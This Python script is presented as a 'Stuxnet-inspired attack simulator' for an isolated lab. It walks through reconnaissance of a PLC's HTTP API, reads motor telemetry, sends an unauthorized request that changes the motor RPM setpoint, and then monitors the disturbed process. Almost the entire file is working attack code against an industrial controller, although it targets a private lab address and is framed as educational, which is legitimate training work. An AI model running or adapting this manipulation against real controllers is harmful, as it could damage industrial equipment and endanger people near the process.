import requests
import time

# ==========================================================
# STUXNET-INSPIRED ATTACK SIMULATOR
# Educational / isolated laboratory simulation only
# ==========================================================

PLC_IP = "192.168.63.143"
PLC_PORT = 5000

PLC_DATA_URL = f"http://{PLC_IP}:{PLC_PORT}/plc/data"
PLC_MODIFY_URL = f"http://{PLC_IP}:{PLC_PORT}/plc/modify"


# ==========================================================
# PHASE 1 - RECONNAISSANCE
# ==========================================================

def reconnaissance():

    print("=" * 60)
    print("        PHASE 1 - RECONNAISSANCE")
    print("=" * 60)

    print(f"[*] Target PLC: {PLC_IP}")
    print(f"[*] Target service: TCP/{PLC_PORT}")
    print("[*] Checking PLC availability...")

    try:

        response = requests.get(
            PLC_DATA_URL,
            timeout=3
        )

        if response.status_code == 200:

            print("[+] PLC service discovered")
            print("[+] HTTP API is accessible")

            return True

        else:

            print(
                f"[-] PLC returned HTTP {response.status_code}"
            )

            return False

    except requests.exceptions.RequestException as e:

        print("[!] PLC is unreachable")
        print(f"[!] Error: {e}")

        return False


# ==========================================================
# PHASE 2 - DISCOVER PLC ENVIRONMENT
# ==========================================================

def discover_plc():

    print()
    print("=" * 60)
    print("        PHASE 2 - PLC DISCOVERY")
    print("=" * 60)

    try:

        response = requests.get(
            PLC_DATA_URL,
            timeout=3
        )

        data = response.json()

        print("[+] PLC data received")
        print()

        print(f"Motor status : {data.get('motor_status')}")
        print(f"RPM          : {data.get('rpm')}")
        print(f"Temperature  : {data.get('temperature')} C")
        print(f"Pressure     : {data.get('pressure')} bar")
        print(f"Vibration    : {data.get('vibration')} mm/s")
        print(f"PLC status   : {data.get('plc_status')}")

        return data

    except Exception as e:

        print(f"[-] PLC discovery failed: {e}")

        return None


# ==========================================================
# PHASE 3 - UNAUTHORIZED PLC MANIPULATION
# ==========================================================

def modify_plc(target_rpm):

    print()
    print("=" * 60)
    print("        PHASE 3 - UNAUTHORIZED PLC MANIPULATION")
    print("=" * 60)

    print(f"[!] Attempting unauthorized RPM modification")
    print(f"[!] Target RPM: {target_rpm}")

    payload = {
        "rpm": target_rpm
    }

    try:

        response = requests.post(
            PLC_MODIFY_URL,
            json=payload,
            timeout=3
        )

        if response.status_code == 200:

            result = response.json()

            print("[+] PLC parameter modified")
            print(f"[+] Authorization: {result.get('authorization')}")
            print(f"[+] New RPM: {result.get('rpm')}")

            return True

        else:

            print(
                f"[-] PLC rejected request: HTTP {response.status_code}"
            )

            print(response.text)

            return False

    except requests.exceptions.RequestException as e:

        print(f"[-] Attack failed: {e}")

        return False


# ==========================================================
# PHASE 4 - PROCESS MANIPULATION
# ==========================================================

def monitor_process():

    print()
    print("=" * 60)
    print("        PHASE 4 - PROCESS MANIPULATION")
    print("=" * 60)

    print("[*] Monitoring PLC process after manipulation...")
    print()

    for i in range(5):

        try:

            response = requests.get(
                PLC_DATA_URL,
                timeout=3
            )

            data = response.json()

            print(
                f"RPM: {data.get('rpm')} | "
                f"Temperature: {data.get('temperature')} C | "
                f"Pressure: {data.get('pressure')} bar | "
                f"Vibration: {data.get('vibration')} mm/s | "
                f"Status: {data.get('plc_status')}"
            )

        except Exception as e:

            print(f"[!] Monitoring error: {e}")

        time.sleep(1)


# ==========================================================
# MAIN ATTACK SIMULATION
# ==========================================================

def main():

    print()
    print("=" * 60)
    print("       STUXNET-INSPIRED ATTACK SIMULATOR")
    print("=" * 60)

    print("[*] Educational isolated-lab simulation")
    print()

    # Phase 1
    if not reconnaissance():

        print("[!] Target PLC not available.")
        return

    time.sleep(1)

    # Phase 2
    plc_data = discover_plc()

    if plc_data is None:

        print("[!] Unable to identify PLC environment.")
        return

    time.sleep(2)

    # Phase 3
    print()
    print("[!] Starting simulated attack...")

    target_rpm = 1800

    if not modify_plc(target_rpm):

        print("[!] PLC manipulation failed.")
        return

    time.sleep(2)

    # Phase 4
    monitor_process()

    print()
    print("=" * 60)
    print("        ATTACK SIMULATION COMPLETE")
    print("=" * 60)


if __name__ == "__main__":

    main()